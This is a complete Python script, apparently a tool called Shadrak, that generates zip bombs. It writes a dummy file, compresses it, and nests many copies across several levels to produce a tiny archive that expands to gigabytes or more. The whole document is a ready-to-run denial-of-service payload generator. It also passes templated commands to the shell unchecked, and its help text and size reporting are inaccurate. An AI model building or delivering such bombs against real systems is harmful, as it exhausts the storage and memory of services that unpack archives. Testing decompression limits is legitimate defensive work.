#!/usr/bin/env python3
import shutil
import os
import sys
import time
import os
import random
import yaml
import subprocess
import argparse


version = '0.5'

class color:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
class log:
    def banner(s):
        if not quiet:
            print( s )
    def debug(s):
        if verbose:
            print(color.YELLOW + "[?] " + color.ENDC + s )
    def info(s):
        if not quiet:
            print(color.BLUE + "[i] " + color.ENDC + s )
    def result(s):
        print(color.GREEN + "[+] " + color.ENDC + s )
    def error(s):
        if not quiet:
            print('%s%s%s%s' % (color.RED, "[!]", color.ENDC, s) )

def get_file_size(filename):
    st = os.stat(filename)
    return st.st_size

def rand_str(str_len):
    return ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(str_len))

def generate_dummy_file(filename, size):
    char = rand_str(1)
    log.debug('Random char to use in dummy file: %s' % char)
    with open(filename,'w') as f:
        for i in range(1024):
            f.write((size) * char)

def get_filename_without_extension(name):
    return name[:name.rfind('.')]

def get_extension(name):
    return name[name.rfind('.')+1:]

def replace(c, i ,o):
    c = c.replace("%in%", i)
    c = c.replace("%out%", o)
    return c

def compress_files(infile, outfile):
    cmd = replace(cmd_multi, infile, outfile)
    log.debug("Compression using command: %s" % cmd)
    subprocess.check_output(cmd, shell=True)

def compress_file(infile, outfile):
    cmd = replace(cmd_single, infile, outfile)
    log.debug("Compression using command: %s" % cmd)
    subprocess.check_output(cmd, shell=True)

def make_copies_and_compress(infile, outfile, n_copies, level):
    gen_files = []
    for i in range(n_copies):
        f_name = '%s-%d.%s' % (get_filename_without_extension(infile), i, ext)
        shutil.copy(infile, f_name)
        gen_files.append(f_name)
    compress_files(' '.join(gen_files), outfile)
    for f_name in gen_files:
        os.remove(f_name)

if __name__ == '__main__':
    # Define arguments
    parser = argparse.ArgumentParser(description='Generates zipbombs in various formats.', epilog='Usage example: python3 shadrak.py zip' )
    parser.add_argument('format',                                                   help='Format of the zipbomb ("list" to list possible values)')
    parser.add_argument('-l', '--level', type=int, default=2,                       help='Levels of nesting')
    parser.add_argument('-n', '--nfile', type=int, default=10,                      help='Number of files in each level')
    parser.add_argument('-s', '--size', type=int, default=1048576,                  help='Size of the dummy file in KB, default is 1048576 Kb (1 GB)')
    parser.add_argument('-o', '--out', default='bomb',                              help='Name of the output file, no extension')
    parser.add_argument('-c', '--conf', default='config/compress.yaml',             help='Name of the output file, no extension')
    parser.add_argument('-v', '--verbose', action='store_true',                     help='Increase output verbosity')
    parser.add_argument('-q', '--quiet', action='store_true',                       help='Suppress all info/debug/error messages')

    # Load user arguments
    args = parser.parse_args()
    if args.verbose and args.quiet:
        parser.error("Error, can't choose both quiet and verbose output")
    verbose = args.verbose
    quiet = args.quiet
    n_levels = args.level
    ext = args.format
    out = args.out
    conf = args.conf
    size = args.size
    nfile = args.nfile
    out_file = '%s.%s' % (out, ext)
    dummy_name = rand_str(8)

    # Read compression command db
    with open(conf, 'r') as f:
        db = yaml.safe_load(f)
        if ext == 'list':
            for key, value in db.items():
                print(key)
            exit()
        if 'both' in db[ext]:
            cmd_single = db[ext]['both']
            cmd_multi = db[ext]['both']
        else:
            cmd_single = db[ext]['single']
            cmd_multi = db[ext]['multi']

    # Start
    log.banner('Shadrak v%s - Generates zipbombs in various formats' % version)
    log.info('User options: %s' % ' '.join(sys.argv))
    log.debug('Extended user options: %s' % args)

    # Create the dummy file
    log.info('Creating a dummy file: %s' % dummy_name)
    start_time = time.time()
    generate_dummy_file(dummy_name, size)
    level_1_zip = '1.%s' % ext
    log.info('Compressing the dummy file: %s' % level_1_zip)
    compress_file(dummy_name, level_1_zip)
    os.remove(dummy_name)
    decompressed_size = 1

    # Create the zipbomb
    log.info('Creating %s levels of compression' % n_levels)
    for i in range(1, n_levels+1):
        tmp_in = '%d.%s' % (i, ext)
        tmp_out = '%d.%s' % (i+1, ext)
        make_copies_and_compress(tmp_in, tmp_out, nfile, i)
        decompressed_size *= nfile
        os.remove(tmp_in)

    # Remove the old output file and rename the new one
    log.info('Cleaning up...')
    if os.path.isfile(out_file):
        os.remove(out_file)
    os.rename('%d.%s' % (n_levels+1,ext), out_file)

    # Output info
    end_time = time.time()
    log.banner('')
    log.info('Decompression bomb actual file size: %.2f KB' % (get_file_size(out_file)/1024.0))
    log.info('Decompression bomb decompressed file size: %d GB' % decompressed_size)
    log.info('Generation Time: %.2fs' % (end_time - start_time))
    log.result('Generated file: %s' % (out_file))
